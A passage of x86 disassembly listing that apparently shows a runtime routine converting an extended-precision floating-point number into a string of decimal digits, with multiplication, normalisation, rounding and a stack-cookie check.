  42819d:	sar    DWORD PTR [ebp-0x44],0x3
  4281a1:	add    edi,0x54
  4281a4:	mov    DWORD PTR [ebp-0x6c],edi
  4281a7:	and    eax,0x7
  4281aa:	je     0x42849c
  4281b0:	imul   ecx,eax,0xc
  4281b3:	mov    eax,0x8000
  4281b8:	add    ecx,edi
  4281ba:	mov    DWORD PTR [ebp-0x68],ecx
  4281bd:	cmp    WORD PTR [ecx],ax
  4281c0:	jb     0x4281d3
  4281c2:	mov    esi,ecx
  4281c4:	lea    edi,[ebp-0x3c]
  4281c7:	lea    ecx,[ebp-0x3c]
  4281ca:	mov    DWORD PTR [ebp-0x68],ecx
  4281cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281d0:	dec    DWORD PTR [ebp-0x3a]
  4281d3:	movzx  edi,WORD PTR [ecx+0xa]
  4281d7:	mov    esi,0x8000
  4281dc:	mov    eax,DWORD PTR [ebp-0x16]
  4281df:	mov    DWORD PTR [ebp-0x5c],edi
  4281e2:	and    edi,0x7fff
  4281e8:	xor    DWORD PTR [ebp-0x5c],eax
  4281eb:	and    eax,0x7fff
  4281f0:	and    DWORD PTR [ebp-0x5c],esi
  4281f3:	mov    DWORD PTR [ebp-0x50],eax
  4281f6:	add    eax,edi
  4281f8:	mov    DWORD PTR [ebp-0x60],edi
  4281fb:	dec    esi
  4281fc:	movzx  edi,ax
  4281ff:	mov    eax,DWORD PTR [ebp-0x50]
  428202:	cmp    ax,si
  428205:	mov    esi,DWORD PTR [ebp-0x40]
  428208:	mov    DWORD PTR [ebp-0x7c],ebx
  42820b:	mov    DWORD PTR [ebp-0x10],ebx
  42820e:	mov    DWORD PTR [ebp-0xc],ebx
  428211:	mov    DWORD PTR [ebp-0x8],ebx
  428214:	mov    DWORD PTR [ebp-0x4c],edi
  428217:	jae    0x428475
  42821d:	mov    ecx,0x7fff
  428222:	cmp    WORD PTR [ebp-0x60],cx
  428226:	mov    ecx,DWORD PTR [ebp-0x68]
  428229:	jae    0x428475
  42822f:	cmp    di,WORD PTR [ebp-0x70]
  428233:	ja     0x428475
  428239:	cmp    di,WORD PTR [ebp-0x54]
  42823d:	ja     0x428247
  42823f:	mov    DWORD PTR [ebp-0x18],ebx
  428242:	jmp    0x42848c
  428247:	test   ax,ax
  42824a:	jne    0x42826c
  42824c:	inc    edi
  42824d:	test   DWORD PTR [ebp-0x18],0x7fffffff
  428254:	mov    DWORD PTR [ebp-0x4c],edi
  428257:	jne    0x42826c
  428259:	test   edx,edx
  42825b:	jne    0x42826c
  42825d:	test   esi,esi
  42825f:	jne    0x42826c
  428261:	xor    eax,eax
  428263:	mov    WORD PTR [ebp-0x16],ax
  428267:	jmp    0x428499
  42826c:	cmp    WORD PTR [ebp-0x60],0x0
  428271:	jne    0x428289
  428273:	inc    edi
  428274:	test   DWORD PTR [ecx+0x8],0x7fffffff
  42827b:	mov    DWORD PTR [ebp-0x4c],edi
  42827e:	jne    0x428289
  428280:	cmp    DWORD PTR [ecx+0x4],ebx
  428283:	jne    0x428289
  428285:	cmp    DWORD PTR [ecx],ebx
  428287:	je     0x42823f
  428289:	push   0x5
  42828b:	mov    eax,ebx
  42828d:	lea    edx,[ebp-0xc]
  428290:	pop    esi
  428291:	mov    DWORD PTR [ebp-0x84],eax
  428297:	mov    DWORD PTR [ebp-0x50],esi
  42829a:	mov    DWORD PTR [ebp-0x60],esi
  42829d:	test   esi,esi
  42829f:	jle    0x428313
  4282a1:	lea    esi,[ebp-0x20]
  4282a4:	lea    eax,[esi+eax*2]
  4282a7:	lea    esi,[ecx+0x8]
  4282aa:	mov    DWORD PTR [ebp-0x88],eax
  4282b0:	mov    DWORD PTR [ebp-0x40],esi
  4282b3:	mov    esi,DWORD PTR [ebp-0x60]
  4282b6:	mov    ecx,DWORD PTR [ebp-0x40]
  4282b9:	movzx  edi,WORD PTR [eax]
  4282bc:	movzx  eax,WORD PTR [ecx]
  4282bf:	imul   edi,eax
  4282c2:	mov    eax,DWORD PTR [edx-0x4]
  4282c5:	mov    DWORD PTR [ebp-0x78],ebx
  4282c8:	lea    ecx,[eax+edi*1]
  4282cb:	cmp    ecx,eax
  4282cd:	mov    DWORD PTR [ebp-0x60],ecx
  4282d0:	mov    eax,ecx
  4282d2:	jb     0x4282d8
  4282d4:	cmp    eax,edi
  4282d6:	jae    0x4282dd
  4282d8:	xor    ecx,ecx
  4282da:	inc    ecx
  4282db:	jmp    0x4282e0
  4282dd:	mov    ecx,DWORD PTR [ebp-0x78]
  4282e0:	mov    DWORD PTR [edx-0x4],eax
  4282e3:	test   ecx,ecx
  4282e5:	je     0x4282ea
  4282e7:	inc    WORD PTR [edx]
  4282ea:	mov    eax,DWORD PTR [ebp-0x88]
  4282f0:	mov    ecx,DWORD PTR [ebp-0x40]
  4282f3:	add    eax,0x2
  4282f6:	sub    ecx,0x2
  4282f9:	mov    DWORD PTR [ebp-0x88],eax
  4282ff:	dec    esi
  428300:	mov    DWORD PTR [ebp-0x40],ecx
  428303:	test   esi,esi
  428305:	jg     0x4282b9
  428307:	mov    ecx,DWORD PTR [ebp-0x68]
  42830a:	mov    esi,DWORD PTR [ebp-0x50]
  42830d:	mov    eax,DWORD PTR [ebp-0x84]
  428313:	add    edx,0x2
  428316:	inc    eax
  428317:	dec    esi
  428318:	mov    DWORD PTR [ebp-0x84],eax
  42831e:	mov    DWORD PTR [ebp-0x50],esi
  428321:	test   esi,esi
  428323:	jg     0x42829a
  428329:	mov    edi,DWORD PTR [ebp-0x4c]
  42832c:	mov    eax,DWORD PTR [ebp-0x8]
  42832f:	add    edi,0xc002
  428335:	mov    esi,DWORD PTR [ebp-0x10]
  428338:	mov    DWORD PTR [ebp-0x40],eax
  42833b:	test   di,di
  42833e:	jle    0x42837b
  428340:	test   eax,eax
  428342:	js     0x428376
  428344:	mov    eax,DWORD PTR [ebp-0xc]
  428347:	mov    edx,esi
  428349:	mov    ecx,eax
  42834b:	shr    edx,0x1f
  42834e:	add    eax,eax
  428350:	shr    ecx,0x1f
  428353:	or     eax,edx
  428355:	add    esi,esi
  428357:	mov    DWORD PTR [ebp-0xc],eax
  42835a:	mov    eax,DWORD PTR [ebp-0x40]
  42835d:	add    eax,eax
  42835f:	mov    DWORD PTR [ebp-0x10],esi
  428362:	or     eax,ecx
  428364:	mov    ecx,0xffff
  428369:	add    edi,ecx
  42836b:	mov    DWORD PTR [ebp-0x40],eax
  42836e:	mov    DWORD PTR [ebp-0x8],eax
  428371:	test   di,di
  428374:	jg     0x428340
  428376:	test   di,di
  428379:	jg     0x4283ec
  42837b:	mov    eax,0xffff
  428380:	add    edi,eax
  428382:	test   di,di
  428385:	jns    0x4283ec
  428387:	mov    ebx,DWORD PTR [ebp-0x40]
  42838a:	mov    eax,edi
  42838c:	neg    eax
  42838e:	xor    edx,edx
  428390:	movzx  eax,ax
  428393:	add    edi,eax
  428395:	mov    DWORD PTR [ebp-0x50],eax
  428398:	mov    DWORD PTR [ebp-0x4c],edi
  42839b:	inc    edx
  42839c:	mov    edi,DWORD PTR [ebp-0x7c]
  42839f:	test   BYTE PTR [ebp-0x10],dl
  4283a2:	je     0x4283a5
  4283a4:	inc    edi
  4283a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4283a8:	mov    eax,ebx
  4283aa:	shl    eax,0x1f
  4283ad:	mov    DWORD PTR [ebp-0x40],ecx
  4283b0:	shr    DWORD PTR [ebp-0x40],1
  4283b3:	or     DWORD PTR [ebp-0x40],eax
  4283b6:	mov    eax,DWORD PTR [ebp-0x40]
  4283b9:	shl    ecx,0x1f
  4283bc:	shr    esi,1
  4283be:	shr    ebx,1
  4283c0:	or     esi,ecx
  4283c2:	dec    DWORD PTR [ebp-0x50]
  4283c5:	mov    DWORD PTR [ebp-0x8],ebx
  4283c8:	mov    DWORD PTR [ebp-0xc],eax
  4283cb:	mov    DWORD PTR [ebp-0x10],esi
  4283ce:	jne    0x42839f
  4283d0:	push   0x0
  4283d2:	mov    DWORD PTR [ebp-0x40],ebx
  4283d5:	test   edi,edi
  4283d7:	mov    edi,DWORD PTR [ebp-0x4c]
  4283da:	pop    ebx
  4283db:	je     0x4283ec
  4283dd:	mov    ax,si
  4283e0:	or     ax,dx
  4283e3:	mov    WORD PTR [ebp-0x10],ax
  4283e7:	mov    esi,DWORD PTR [ebp-0x10]
  4283ea:	jmp    0x4283f0
  4283ec:	mov    ax,WORD PTR [ebp-0x10]
  4283f0:	mov    ecx,0x8000
  4283f5:	cmp    ax,cx
  4283f8:	ja     0x428408
  4283fa:	and    esi,0x1ffff
  428400:	cmp    esi,0x18000
  428406:	jne    0x428448
  428408:	mov    eax,DWORD PTR [ebp-0xe]
  42840b:	cmp    eax,0xffffffff
  42840e:	jne    0x428444
  428410:	mov    eax,DWORD PTR [ebp-0xa]
  428413:	mov    DWORD PTR [ebp-0xe],ebx
  428416:	cmp    eax,0xffffffff
  428419:	jne    0x42843b
  42841b:	mov    ax,WORD PTR [ebp-0x6]
  42841f:	mov    edx,0xffff
  428424:	mov    DWORD PTR [ebp-0xa],ebx
  428427:	cmp    ax,dx
  42842a:	jne    0x428433
  42842c:	mov    WORD PTR [ebp-0x6],cx
  428430:	inc    edi
  428431:	jmp    0x42843f
  428433:	inc    ax
  428435:	mov    WORD PTR [ebp-0x6],ax
  428439:	jmp    0x42843f
  42843b:	inc    eax
  42843c:	mov    DWORD PTR [ebp-0xa],eax
  42843f:	mov    ecx,DWORD PTR [ebp-0x8]
  428442:	jmp    0x42844b
  428444:	inc    eax
  428445:	mov    DWORD PTR [ebp-0xe],eax
  428448:	mov    ecx,DWORD PTR [ebp-0x40]
  42844b:	mov    eax,0x7fff
  428450:	cmp    di,ax
  428453:	jae    0x428475
  428455:	mov    ax,WORD PTR [ebp-0xe]
  428459:	or     edi,DWORD PTR [ebp-0x5c]
  42845c:	mov    WORD PTR [ebp-0x20],ax
  428460:	mov    eax,DWORD PTR [ebp-0xc]
  428463:	mov    DWORD PTR [ebp-0x1e],eax
  428466:	mov    esi,DWORD PTR [ebp-0x20]
  428469:	mov    DWORD PTR [ebp-0x1a],ecx
  42846c:	mov    edx,DWORD PTR [ebp-0x1c]
  42846f:	mov    WORD PTR [ebp-0x16],di
  428473:	jmp    0x428496
  428475:	xor    eax,eax
  428477:	cmp    WORD PTR [ebp-0x5c],ax
  42847b:	sete   al
  42847e:	dec    eax
  42847f:	and    eax,0x80000000
  428484:	add    eax,0x7fff8000
  428489:	mov    DWORD PTR [ebp-0x18],eax
  42848c:	mov    esi,ebx
  42848e:	mov    edx,ebx
  428490:	mov    DWORD PTR [ebp-0x20],esi
  428493:	mov    DWORD PTR [ebp-0x1c],edx
  428496:	mov    DWORD PTR [ebp-0x40],esi
  428499:	mov    edi,DWORD PTR [ebp-0x6c]
  42849c:	mov    eax,DWORD PTR [ebp-0x44]
  42849f:	test   eax,eax
  4284a1:	jne    0x42819d
  4284a7:	mov    ecx,DWORD PTR [ebp-0x48]
  4284aa:	jmp    0x4284b2
  4284ac:	mov    edx,DWORD PTR [ebp-0x1c]
  4284af:	mov    esi,DWORD PTR [ebp-0x20]
  4284b2:	mov    eax,DWORD PTR [ebp-0x18]
  4284b5:	mov    edi,0x3fff
  4284ba:	shr    eax,0x10
  4284bd:	cmp    ax,di
  4284c0:	jb     0x428765
  4284c6:	inc    ecx
  4284c7:	mov    DWORD PTR [ebp-0x78],ebx
  4284ca:	mov    DWORD PTR [ebp-0x48],ecx
  4284cd:	mov    ecx,eax
  4284cf:	mov    eax,DWORD PTR [ebp-0x26]
  4284d2:	mov    edi,eax
  4284d4:	xor    edi,ecx
  4284d6:	mov    DWORD PTR [ebp-0x10],ebx
  4284d9:	and    edi,0x8000
  4284df:	mov    DWORD PTR [ebp-0xc],ebx
  4284e2:	mov    DWORD PTR [ebp-0x44],edi
  4284e5:	mov    edi,0x7fff
  4284ea:	and    eax,edi
  4284ec:	mov    DWORD PTR [ebp-0x8],ebx
  4284ef:	and    ecx,edi
  4284f1:	mov    DWORD PTR [ebp-0x7c],eax
  4284f4:	add    eax,ecx
  4284f6:	movzx  edi,ax
  4284f9:	mov    eax,0x7fff
  4284fe:	mov    DWORD PTR [ebp-0x4c],edi
  428501:	cmp    cx,ax
  428504:	jae    0x42874a
  42850a:	mov    eax,DWORD PTR [ebp-0x7c]
  42850d:	cmp    ax,WORD PTR [ebp-0x64]
  428511:	jae    0x42874a
  428517:	cmp    di,WORD PTR [ebp-0x70]
  42851b:	ja     0x42874a
  428521:	cmp    di,WORD PTR [ebp-0x54]
  428525:	ja     0x42852f
  428527:	mov    DWORD PTR [ebp-0x18],ebx
  42852a:	jmp    0x428761
  42852f:	test   cx,cx
  428532:	jne    0x428554
  428534:	inc    edi
  428535:	test   DWORD PTR [ebp-0x18],0x7fffffff
  42853c:	mov    DWORD PTR [ebp-0x4c],edi
  42853f:	jne    0x428554
  428541:	test   edx,edx
  428543:	jne    0x428554
  428545:	test   esi,esi
  428547:	jne    0x428554
  428549:	xor    eax,eax
  42854b:	mov    WORD PTR [ebp-0x16],ax
  42854f:	jmp    0x428765
  428554:	test   ax,ax
  428557:	jne    0x428572
  428559:	inc    edi
  42855a:	test   DWORD PTR [ebp-0x28],0x7fffffff
  428561:	mov    DWORD PTR [ebp-0x4c],edi
  428564:	jne    0x428572
  428566:	cmp    DWORD PTR [ebp-0x2c],0x0
  42856a:	jne    0x428572
  42856c:	cmp    DWORD PTR [ebp-0x30],0x0
  428570:	je     0x428527
  428572:	mov    edx,ebx
  428574:	lea    ecx,[ebp-0xc]
  428577:	push   0x5
  428579:	mov    DWORD PTR [ebp-0x50],edx
  42857c:	pop    eax
  42857d:	mov    esi,eax
  42857f:	test   eax,eax
  428581:	jle    0x4285db
  428583:	lea    edi,[ebp-0x20]
  428586:	lea    eax,[ebp-0x28]
  428589:	lea    edi,[edi+edx*2]
  42858c:	mov    DWORD PTR [ebp-0x70],eax
  42858f:	mov    DWORD PTR [ebp-0x54],edi
  428592:	movzx  edx,WORD PTR [eax]
  428595:	movzx  eax,WORD PTR [edi]
  428598:	imul   edx,eax
  42859b:	mov    eax,DWORD PTR [ecx-0x4]
  42859e:	mov    DWORD PTR [ebp-0x64],ebx
  4285a1:	lea    edi,[eax+edx*1]
  4285a4:	cmp    edi,eax
  4285a6:	jb     0x4285ac
  4285a8:	cmp    edi,edx
  4285aa:	jae    0x4285b1
  4285ac:	xor    eax,eax
  4285ae:	inc    eax
  4285af:	jmp    0x4285b4
  4285b1:	mov    eax,DWORD PTR [ebp-0x64]
  4285b4:	mov    DWORD PTR [ecx-0x4],edi
  4285b7:	test   eax,eax
  4285b9:	je     0x4285be
  4285bb:	inc    WORD PTR [ecx]
  4285be:	mov    edi,DWORD PTR [ebp-0x54]
  4285c1:	mov    eax,DWORD PTR [ebp-0x70]
  4285c4:	add    edi,0x2
  4285c7:	sub    eax,0x2
  4285ca:	mov    DWORD PTR [ebp-0x54],edi
  4285cd:	dec    esi
  4285ce:	mov    DWORD PTR [ebp-0x70],eax
  4285d1:	test   esi,esi
  4285d3:	jg     0x428592
  4285d5:	mov    edx,DWORD PTR [ebp-0x50]
  4285d8:	mov    eax,DWORD PTR [ebp-0x58]
  4285db:	add    ecx,0x2
  4285de:	inc    edx
  4285df:	dec    eax
  4285e0:	mov    DWORD PTR [ebp-0x50],edx
  4285e3:	mov    DWORD PTR [ebp-0x58],eax
  4285e6:	test   eax,eax
  4285e8:	jg     0x42857d
  4285ea:	mov    edi,DWORD PTR [ebp-0x4c]
  4285ed:	mov    esi,DWORD PTR [ebp-0x8]
  4285f0:	add    edi,0xc002
  4285f6:	test   di,di
  4285f9:	jle    0x42869b
  4285ff:	mov    ebx,DWORD PTR [ebp-0x10]
  428602:	mov    DWORD PTR [ebp-0x68],ebx
  428605:	test   esi,esi
  428607:	js     0x428635
  428609:	mov    eax,DWORD PTR [ebp-0xc]
  42860c:	mov    edx,ebx
  42860e:	mov    ecx,eax
  428610:	shr    edx,0x1f
  428613:	add    eax,eax
  428615:	shr    ecx,0x1f
  428618:	or     eax,edx
  42861a:	add    esi,esi
  42861c:	mov    DWORD PTR [ebp-0xc],eax
  42861f:	add    ebx,ebx
  428621:	mov    eax,0xffff
  428626:	mov    DWORD PTR [ebp-0x10],ebx
  428629:	or     esi,ecx
  42862b:	add    edi,eax
  42862d:	mov    DWORD PTR [ebp-0x8],esi
  428630:	test   di,di
  428633:	jg     0x428605
  428635:	mov    DWORD PTR [ebp-0x68],ebx
  428638:	mov    edx,DWORD PTR [ebp-0x68]
  42863b:	push   0x0
  42863d:	pop    ebx
  42863e:	test   di,di
  428641:	jle    0x42869e
  428643:	mov    cx,WORD PTR [ebp-0x10]
  428647:	mov    eax,0x8000
  42864c:	cmp    cx,ax
  42864f:	ja     0x428663
  428651:	and    edx,0x1ffff
  428657:	cmp    edx,0x18000
  42865d:	jne    0x428720
  428663:	mov    eax,DWORD PTR [ebp-0xe]
  428666:	cmp    eax,0xffffffff
  428669:	jne    0x42871c
  42866f:	mov    eax,DWORD PTR [ebp-0xa]
  428672:	mov    DWORD PTR [ebp-0xe],ebx
  428675:	cmp    eax,0xffffffff
  428678:	jne    0x428713
  42867e:	mov    ax,WORD PTR [ebp-0x6]
  428682:	mov    ecx,0xffff
  428687:	mov    DWORD PTR [ebp-0xa],ebx
  42868a:	cmp    ax,cx
  42868d:	jne    0x42870b
  42868f:	mov    eax,0x8000
  428694:	inc    edi
  428695:	mov    WORD PTR [ebp-0x6],ax
  428699:	jmp    0x428717
  42869b:	mov    edx,DWORD PTR [ebp-0x10]
  42869e:	mov    eax,0xffff
  4286a3:	add    edi,eax
  4286a5:	test   di,di
  4286a8:	jns    0x428643
  4286aa:	mov    eax,edi
  4286ac:	neg    eax
  4286ae:	movzx  eax,ax
  4286b1:	add    edi,eax
  4286b3:	mov    DWORD PTR [ebp-0x58],eax
  4286b6:	mov    DWORD PTR [ebp-0x4c],edi
  4286b9:	mov    edi,DWORD PTR [ebp-0x78]
  4286bc:	test   BYTE PTR [ebp-0x10],0x1
  4286c0:	je     0x4286c3
  4286c2:	inc    edi
  4286c3:	mov    ebx,DWORD PTR [ebp-0xc]
  4286c6:	mov    eax,esi
  4286c8:	mov    ecx,ebx
  4286ca:	shl    eax,0x1f
  4286cd:	shl    ecx,0x1f
  4286d0:	shr    ebx,1
  4286d2:	shr    edx,1
  4286d4:	or     ebx,eax
  4286d6:	or     edx,ecx
  4286d8:	shr    esi,1
  4286da:	dec    DWORD PTR [ebp-0x58]
  4286dd:	mov    DWORD PTR [ebp-0xc],ebx
  4286e0:	mov    DWORD PTR [ebp-0x10],edx
  4286e3:	jne    0x4286bc
  4286e5:	push   0x0
  4286e7:	test   edi,edi
  4286e9:	mov    DWORD PTR [ebp-0x8],esi
  4286ec:	mov    edi,DWORD PTR [ebp-0x4c]
  4286ef:	pop    ebx
  4286f0:	je     0x428643
  4286f6:	xor    eax,eax
  4286f8:	mov    cx,dx
  4286fb:	inc    eax
  4286fc:	or     cx,ax
  4286ff:	mov    WORD PTR [ebp-0x10],cx
  428703:	mov    edx,DWORD PTR [ebp-0x10]
  428706:	jmp    0x428647
  42870b:	inc    ax
  42870d:	mov    WORD PTR [ebp-0x6],ax
  428711:	jmp    0x428717
  428713:	inc    eax
  428714:	mov    DWORD PTR [ebp-0xa],eax
  428717:	mov    esi,DWORD PTR [ebp-0x8]
  42871a:	jmp    0x428720
  42871c:	inc    eax
  42871d:	mov    DWORD PTR [ebp-0xe],eax
  428720:	mov    eax,0x7fff
  428725:	cmp    di,ax
  428728:	jae    0x42874a
  42872a:	mov    ax,WORD PTR [ebp-0xe]
  42872e:	or     edi,DWORD PTR [ebp-0x44]
  428731:	mov    WORD PTR [ebp-0x20],ax
  428735:	mov    eax,DWORD PTR [ebp-0xc]
  428738:	mov    DWORD PTR [ebp-0x1e],eax
  42873b:	mov    DWORD PTR [ebp-0x1a],esi
  42873e:	mov    edx,DWORD PTR [ebp-0x1c]
  428741:	mov    esi,DWORD PTR [ebp-0x20]
  428744:	mov    WORD PTR [ebp-0x16],di
  428748:	jmp    0x428765
  42874a:	xor    eax,eax
  42874c:	cmp    WORD PTR [ebp-0x44],ax
  428750:	sete   al
  428753:	dec    eax
  428754:	and    eax,0x80000000
  428759:	add    eax,0x7fff8000
  42875e:	mov    DWORD PTR [ebp-0x18],eax
  428761:	mov    esi,ebx
  428763:	mov    edx,ebx
  428765:	test   BYTE PTR [ebp+0x18],0x1
  428769:	mov    ecx,DWORD PTR [ebp-0x74]
  42876c:	mov    eax,DWORD PTR [ebp-0x48]
  42876f:	mov    edi,DWORD PTR [ebp+0x14]
  428772:	mov    WORD PTR [ecx],ax
  428775:	je     0x4287ad
  428777:	cwde   
  428778:	add    edi,eax
  42877a:	mov    DWORD PTR [ebp-0x48],edi
  42877d:	test   edi,edi
  42877f:	jg     0x4287b0
  428781:	xor    eax,eax
  428783:	mov    WORD PTR [ecx],ax
  428786:	mov    eax,0x8000
  42878b:	cmp    WORD PTR [ebp-0x80],ax
  42878f:	setne  al
  428792:	dec    al
  428794:	and    al,0xd
  428796:	add    al,0x20
  428798:	mov    BYTE PTR [ecx+0x2],al
  42879b:	xor    eax,eax
  42879d:	inc    eax
  42879e:	mov    BYTE PTR [ecx+0x3],al
  4287a1:	mov    BYTE PTR [ecx+0x4],0x30
  4287a5:	mov    BYTE PTR [ecx+0x5],bl
  4287a8:	jmp    0x428959
  4287ad:	mov    DWORD PTR [ebp-0x48],edi
  4287b0:	push   0x15
  4287b2:	pop    eax
  4287b3:	cmp    edi,eax
  4287b5:	jle    0x4287ba
  4287b7:	mov    DWORD PTR [ebp-0x48],eax
  4287ba:	mov    edi,DWORD PTR [ebp-0x18]
  4287bd:	shr    edi,0x10
  4287c0:	sub    edi,0x3ffe
  4287c6:	xor    eax,eax
  4287c8:	push   0x8
  4287ca:	mov    DWORD PTR [ebp-0x64],edi
  4287cd:	mov    WORD PTR [ebp-0x16],ax
  4287d1:	mov    ebx,DWORD PTR [ebp-0x18]
  4287d4:	pop    edi
  4287d5:	mov    ecx,edx
  4287d7:	mov    eax,esi
  4287d9:	shr    eax,0x1f
  4287dc:	add    edx,edx
  4287de:	shr    ecx,0x1f
  4287e1:	add    ebx,ebx
  4287e3:	add    esi,esi
  4287e5:	or     ebx,ecx
  4287e7:	or     edx,eax
  4287e9:	mov    DWORD PTR [ebp-0x20],esi
  4287ec:	mov    DWORD PTR [ebp-0x18],ebx
  4287ef:	dec    edi
  4287f0:	jne    0x4287d5
  4287f2:	mov    edi,DWORD PTR [ebp-0x64]
  4287f5:	mov    DWORD PTR [ebp-0x44],ebx
  4287f8:	mov    DWORD PTR [ebp-0x1c],edx
  4287fb:	mov    DWORD PTR [ebp-0x40],esi
  4287fe:	push   0x0
  428800:	pop    ebx
  428801:	test   edi,edi
  428803:	jns    0x42883c
  428805:	neg    edi
  428807:	and    edi,0xff
  42880d:	jle    0x42883c
  42880f:	mov    ebx,DWORD PTR [ebp-0x44]
  428812:	mov    ecx,edx
  428814:	shr    esi,1
  428816:	mov    eax,ebx
  428818:	shl    ecx,0x1f
  42881b:	shl    eax,0x1f
  42881e:	or     esi,ecx
  428820:	shr    edx,1
  428822:	shr    ebx,1
  428824:	or     edx,eax
  428826:	dec    edi
  428827:	mov    DWORD PTR [ebp-0x18],ebx
  42882a:	mov    DWORD PTR [ebp-0x20],esi
  42882d:	test   edi,edi
  42882f:	jg     0x428812
  428831:	mov    DWORD PTR [ebp-0x44],ebx
  428834:	xor    ebx,ebx
  428836:	mov    DWORD PTR [ebp-0x1c],edx
  428839:	mov    DWORD PTR [ebp-0x40],esi
  42883c:	mov    esi,DWORD PTR [ebp-0x74]
  42883f:	mov    eax,DWORD PTR [ebp-0x48]
  428842:	inc    eax
  428843:	mov    DWORD PTR [ebp-0x54],eax
  428846:	lea    edi,[esi+0x4]
  428849:	mov    DWORD PTR [ebp-0x64],edi
  42884c:	mov    ecx,edi
  42884e:	mov    DWORD PTR [ebp-0x58],ecx
  428851:	test   eax,eax
  428853:	jle    0x428921
  428859:	lea    esi,[ebp-0x20]
  42885c:	mov    ecx,edx
  42885e:	lea    edi,[ebp-0x3c]
  428861:	shr    ecx,0x1f
  428864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428865:	add    edx,edx
  428867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428868:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428869:	mov    edi,DWORD PTR [ebp-0x40]
  42886c:	mov    eax,edi
  42886e:	shr    eax,0x1f
  428871:	add    edi,edi
  428873:	or     edx,eax
  428875:	mov    eax,DWORD PTR [ebp-0x44]
  428878:	lea    esi,[eax+eax*1]
  42887b:	mov    eax,edi
  42887d:	or     esi,ecx
  42887f:	shr    eax,0x1f
  428882:	mov    ecx,edx
  428884:	add    edi,edi
  428886:	add    edx,edx
  428888:	shr    ecx,0x1f
  42888b:	or     edx,eax
  42888d:	add    esi,esi
  42888f:	mov    eax,DWORD PTR [ebp-0x3c]
  428892:	or     esi,ecx
  428894:	lea    ecx,[eax+edi*1]
  428897:	mov    DWORD PTR [ebp-0x48],ecx
  42889a:	cmp    ecx,edi
  42889c:	jb     0x4288a2
  42889e:	cmp    ecx,eax
  4288a0:	jae    0x4288bd
  4288a2:	lea    eax,[edx+0x1]
  4288a5:	mov    ecx,ebx
  4288a7:	cmp    eax,edx
  4288a9:	jb     0x4288b0
  4288ab:	cmp    eax,0x1
  4288ae:	jae    0x4288b3
  4288b0:	xor    ecx,ecx
  4288b2:	inc    ecx
  4288b3:	test   ecx,ecx
  4288b5:	mov    edx,eax
  4288b7:	mov    ecx,DWORD PTR [ebp-0x48]
  4288ba:	je     0x4288bd
  4288bc:	inc    esi
  4288bd:	mov    eax,DWORD PTR [ebp-0x38]
  4288c0:	lea    edi,[eax+edx*1]
  4288c3:	cmp    edi,edx
  4288c5:	jb     0x4288cb
  4288c7:	cmp    edi,eax
  4288c9:	jae    0x4288cc
  4288cb:	inc    esi
  4288cc:	add    esi,DWORD PTR [ebp-0x34]
  4288cf:	mov    eax,ecx
  4288d1:	mov    edx,DWORD PTR [ebp-0x48]
  4288d4:	mov    ecx,edi
  4288d6:	add    edx,edx
  4288d8:	shr    eax,0x1f
  4288db:	mov    DWORD PTR [ebp-0x40],edx
  4288de:	mov    DWORD PTR [ebp-0x20],edx
  4288e1:	lea    edx,[edi+edi*1]
  4288e4:	or     edx,eax
  4288e6:	shr    ecx,0x1f
  4288e9:	lea    eax,[esi+esi*1]
  4288ec:	mov    DWORD PTR [ebp-0x1c],edx
  4288ef:	or     eax,ecx
  4288f1:	mov    ecx,DWORD PTR [ebp-0x58]
  4288f4:	mov    DWORD PTR [ebp-0x18],eax
  4288f7:	shr    eax,0x18
  4288fa:	add    al,0x30
  4288fc:	mov    BYTE PTR [ebp-0x15],bl
  4288ff:	mov    BYTE PTR [ecx],al
  428901:	inc    ecx
  428902:	mov    eax,DWORD PTR [ebp-0x54]
  428905:	dec    eax
  428906:	mov    DWORD PTR [ebp-0x58],ecx
  428909:	mov    DWORD PTR [ebp-0x54],eax
  42890c:	test   eax,eax
  42890e:	jle    0x42891b
  428910:	mov    eax,DWORD PTR [ebp-0x18]
  428913:	mov    DWORD PTR [ebp-0x44],eax
  428916:	jmp    0x428859
  42891b:	mov    esi,DWORD PTR [ebp-0x74]
  42891e:	mov    edi,DWORD PTR [ebp-0x64]
  428921:	mov    al,BYTE PTR [ecx-0x1]
  428924:	sub    ecx,0x2
  428927:	cmp    al,0x35
  428929:	jl     0x428970
  42892b:	jmp    0x428936
  42892d:	cmp    BYTE PTR [ecx],0x39
  428930:	jne    0x42893a
  428932:	mov    BYTE PTR [ecx],0x30
  428935:	dec    ecx
  428936:	cmp    ecx,edi
  428938:	jae    0x42892d
  42893a:	cmp    ecx,edi
  42893c:	jae    0x428942
  42893e:	inc    ecx
  42893f:	inc    WORD PTR [esi]
  428942:	inc    BYTE PTR [ecx]
  428944:	mov    eax,DWORD PTR [ebp-0x74]
  428947:	sub    cl,al
  428949:	sub    cl,0x3
  42894c:	mov    BYTE PTR [eax+0x3],cl
  42894f:	movsx  ecx,cl
  428952:	mov    BYTE PTR [ecx+eax*1+0x4],bl
  428956:	xor    eax,eax
  428958:	inc    eax
  428959:	mov    ecx,DWORD PTR [ebp-0x4]
  42895c:	pop    edi
  42895d:	pop    esi
  42895e:	xor    ecx,ebp
  428960:	pop    ebx
  428961:	call   0x421878
  428966:	mov    esp,ebp
  428968:	pop    ebp
  428969:	ret    
  42896a:	cmp    BYTE PTR [ecx],0x30
  42896d:	jne    0x428974
  42896f:	dec    ecx
  428970:	cmp    ecx,edi
  428972:	jae    0x42896a
  428974:	cmp    ecx,edi
  428976:	jae    0x428944
  428978:	mov    ecx,DWORD PTR [ebp-0x74]
  42897b:	xor    eax,eax
  42897d:	mov    WORD PTR [ecx],ax
  428980:	mov    eax,0x8000
  428985:	cmp    WORD PTR [ebp-0x80],ax
  428989:	setne  al
  42898c:	dec    al
  42898e:	and    al,0xd
  428990:	add    al,0x20
  428992:	mov    BYTE PTR [ecx+0x2],al
  428995:	xor    eax,eax
  428997:	inc    eax
  428998:	mov    BYTE PTR [ecx+0x3],al
  42899b:	mov    BYTE PTR [edi],0x30
  42899e:	jmp    0x4287a5
  4289a3:	xor    ebx,ebx
  4289a5:	push   ebx
  4289a6:	push   ebx
  4289a7:	push   ebx
  4289a8:	push   ebx
  4289a9:	push   ebx
  4289aa:	call   0x41fb45
